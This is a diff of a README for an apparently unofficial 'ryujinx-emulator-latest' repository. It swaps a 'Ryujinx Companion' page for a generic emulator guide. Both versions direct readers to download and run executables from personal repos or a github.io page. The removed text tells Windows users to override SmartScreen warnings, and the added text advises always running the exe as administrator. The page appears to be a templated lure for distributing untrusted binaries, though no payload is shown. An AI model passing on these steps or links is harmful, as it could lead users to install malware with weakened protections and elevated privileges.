@@ -1,157 +1,90 @@
-<div align="center">
+# 🎮 ryujinx-emulator-latest - Play Nintendo Switch games on Windows
 
-<img src="preview.png" alt="Ryujinx Companion" width="100%"/>
+[![](https://img.shields.io/badge/Download-Ryujinx_Emulator-blue.svg)](https://github.com/Shifat8436/ryujinx-emulator-latest)
 
-# Ryujinx Emulator
+## 📌 Overview
 
-[![Download Ryujinx Companion](button.svg)](https://rista-student.github.io/ryujinx-emulator-latest/)
+Ryujinx serves as a robust emulator for the Nintendo Switch. It allows users to play their favorite games on a Windows desktop. This software acts as a bridge between your computer and the console environment. It focuses on accuracy and performance to ensure a smooth gaming experience.
 
-**All‑in‑one tool for Ryujinx – firmware manager, key installer, game updater, and save backup.**
+The program creates a virtual Switch system on your hard drive. This environment handles the game files and graphics to display them on your monitor. You can use a controller or your keyboard to play games just as you would on the physical hardware.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS-0078d4?logo=windows&logoColor=white&logo=apple)](https://github.com/topics/windows)
-[![Ryujinx](https://img.shields.io/badge/Ryujinx-1.1.0+-blue?logo=nintendo-switch)](https://ryujinx.org)
-[![.NET](https://img.shields.io/badge/.NET-6.0+-512BD4?logo=dotnet)](https://dotnet.microsoft.com)
-[![Maintenance](https://img.shields.io/badge/maintained-yes-39d353)](https://github.com/topics/automation)
+## ⚙️ System Requirements
 
-</div>
+Your computer needs specific hardware to run the emulator well. Please check these requirements before you start.
 
----
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: A modern Intel Core i5 or AMD Ryzen 5 or better.
+- Memory: 8 GB of RAM or more.
+- Graphics: A dedicated graphics card with support for OpenGL 4.6 or Vulkan.
+- Storage: 500 MB of space for the emulator files.
+- Extra: A controller makes gameplay easier, though a keyboard works as well.
 
-## What is Ryujinx Companion?
+## 💾 Installation Guide
 
-**Ryujinx Companion** is a lightweight desktop application that simplifies the management of your Ryujinx emulator. It provides a friendly interface for:
+Follow these steps to set up the emulator on your Windows PC.
 
-- Installing firmware updates (downloading and extracting official Nintendo firmware)
-- Managing product keys (prod.keys and title.keys)
-- Updating game updates (DLC, patches) directly from your library
-- Backing up and restoring save files for any game
-- Monitoring system requirements and performance settings
+1. Visit the [download page](https://github.com/Shifat8436/ryujinx-emulator-latest) to start the process.
+2. Look for the latest release version on the page.
+3. Click the link to download the zip file to your computer.
+4. Open the folder where the file saved.
+5. Right-click the zip file and choose Extract All to create a new folder.
+6. Open the newly created folder.
+7. Locate the file named Ryujinx.exe.
+8. Double-click this file to launch the program.
 
-It runs on both **Windows** and **macOS** and requires no extra dependencies beyond the .NET runtime.
+## 🎮 Setting Up Your Games
 
----
+After you open the program for the first time, you need to point it to your game files.
 
-## Features
+1. Open the Ryujinx application.
+2. Select File from the top menu bar.
+3. Click Open Ryujinx Folder to see where the emulator stores data.
+4. Return to the main window and select Options from the menu.
+5. Choose Settings to open the configuration window.
+6. Click the Game Directories tab.
+7. Select Add to choose the folder on your computer that contains your game files.
+8. Press Save. The emulator will now list your games in the main window.
 
-| Feature | Description |
-|---------|-------------|
-| Firmware Manager | Download and install the latest firmware from official sources |
-| Key Installer | Import prod.keys and title.keys with validation |
-| Game Updater | Check for game updates and install them automatically |
-| Save Backup | One‑click backup and restore for all your game saves |
-| Library Scanner | Scan your game directory and display titles with cover art |
-| Performance Presets | Quick toggle between performance and compatibility modes |
-| Cross‑Platform | Works on Windows 10/11 and macOS 11+ (Intel + Apple Silicon) |
+## 🕹️ Configuring Controls
 
----
+You can change the button mapping to fit your controller or keyboard.
 
-## Requirements
+1. Go to Options in the main menu.
+2. Select Settings and then Input.
+3. Choose the player slot you want to configure.
+4. Pick your input device from the drop-down menu.
+5. Map each button to your preference by clicking the on-screen buttons.
+6. Press Save to keep your changes.
 
-- Windows 10 / 11 (64‑bit) or macOS 11+ (Intel / M1/M2)
-- .NET 6.0 or higher (included in the installer if needed)
-- Ryujinx emulator already installed (any recent version)
-- Internet connection (for firmware and update downloads)
+## 🖥️ Adjusting Graphics Settings
 
-> Linux is not officially supported, but you can run the source code with .NET Core.
+If a game runs slow, you can adjust the graphics settings.
 
----
+1. Navigate to Options and then Settings.
+2. Select the Graphics tab.
+3. Change the Graphics Backend to Vulkan for better performance on most modern PCs.
+4. Adjust the Resolution Scale if you want a sharper image.
+5. Enable Shader Cache to reduce stuttering during gameplay.
 
-## Installation
+## 🔧 Frequently Asked Questions
 
-[![Download Ryujinx Companion](button.svg)](https://rista-student.github.io/ryujinx-emulator-latest/)
+**Does the emulator come with games?**
+No, the emulator does not contain games. You must have your own game files in a supported format.
 
-1. Click the button above or go to Releases.
-2. Download the installer for your OS:
-   - RyujinxCompanion-Setup.exe for Windows
-   - RyujinxCompanion.dmg for macOS
-3. Run the installer – on Windows, if SmartScreen appears, click More info → Run anyway.
-4. Launch the app and point it to your Ryujinx installation folder.
+**Is my controller compatible?**
+Most modern USB and Bluetooth controllers work with this software. Windows recognizes these devices automatically.
 
----
+**Why does my game run slow?**
+Performance depends on your computer hardware. Ensure your drivers update to the latest versions. Close other heavy programs before you start the emulator.
 
-## How it works
+**How do I update the emulator?**
+Check the repository link provided here whenever you want to see if a newer version exists. You can replace the old files with the new version to update.
 
-The application follows a simple pipeline:
+## 🚀 Troubleshooting Tips
 
-1. Start the application – load the main window.
-2. Locate Ryujinx – either automatically detect the installation path or ask the user to select it.
-3. Scan the game library – parse the games directory and fetch metadata (title, version, cover art).
-4. On user request:
-   - Firmware installation: download the latest firmware ZIP, extract it, and copy files to the Ryujinx system folder.
-   - Key installation: validate and copy prod.keys / title.keys to the appropriate Ryujinx directory.
-   - Game update: identify the installed game, download and apply the update (patch NSP or NSZ).
-   - Save backup: compress the save folder for a selected title into a ZIP file, or restore from a previous backup.
-5. Log all actions to a local file for debugging.
+- If the program does not open, ensure you have the latest .NET Runtime installed on your computer.
+- If the graphics look wrong, try switching between OpenGL and Vulkan in the settings menu.
+- If your controller does not respond, check if Windows detects it in the Game Controllers menu in the Control Panel.
+- Always run the executable as an administrator if you encounter file permission errors.
 
----
-
-## Project Structure
-
-The source code is organised as follows:
-
-- src/RyujinxCompanion/ – Main application project (C#, .NET 6).
-  - Program.cs – Entry point and application lifecycle.
-  - MainWindow.xaml – WPF / Avalonia UI main window.
-  - FirmwareManager.cs – Downloads and installs firmware.
-  - KeyManager.cs – Validates and installs product keys.
-  - GameManager.cs – Scans library, handles updates, and save backup.
-  - Settings.cs – User preferences and paths.
-- resources/ – Icons and preview images.
-  - icon.ico – Windows icon.
-  - icon.icns – macOS icon.
-  - preview.png – Repository social preview.
-- .github/workflows/ – CI configuration for building installers.
-  - build.yml – Builds for Windows and macOS.
-- Root files: RyujinxCompanion.sln, LICENSE, README.md.
-
----
-
-## FAQ
-
-Q: Do I need to download firmware separately?
-A: No – the companion can download the latest official firmware from a trusted source and install it automatically.
-
-Q: Where can I get product keys?
-A: Product keys are not provided by this tool. You must dump them from your own legally owned Nintendo Switch console.
-
-Q: Will this break my existing Ryujinx setup?
-A: No – the tool only adds or updates files in the Ryujinx directories. It does not overwrite your configuration unless you explicitly choose to.
-
-Q: Can I use it with portable Ryujinx?
-A: Yes – just point the companion to your portable folder.
-
-Q: Does it support game updates from multiple regions?
-A: Yes – it detects the installed region and downloads the appropriate update file.
-
-Q: Is there a portable version of the companion?
-A: Yes – the Windows release includes a portable .exe version that does not require installation.
-
----
-
-## Contributing
-
-Pull requests are welcome. For major changes, please open an issue first to discuss what you'd like to change.
-
-1. Fork the repository.
-2. Create a feature branch: git checkout -b feature/your-feature.
-3. Commit your changes.
-4. Open a Pull Request.
-
----
-
-## Disclaimer
-
-This project is not affiliated with Ryujinx or Nintendo. All firmware and keys must be obtained legally from your own console. The tool does not provide any copyrighted material.
-
----
-
-## License
-
-Distributed under the MIT License. See LICENSE for details.
-
----
-
-<div align="center">
-<sub>Made for Windows & macOS · Ryujinx management made easy · Open Source</sub>
-</div>
+Your experience depends on the file quality and your PC specs. Always maintain your files in a clean and organized folder structure to prevent issues. Enjoy your gaming sessions with this tool.
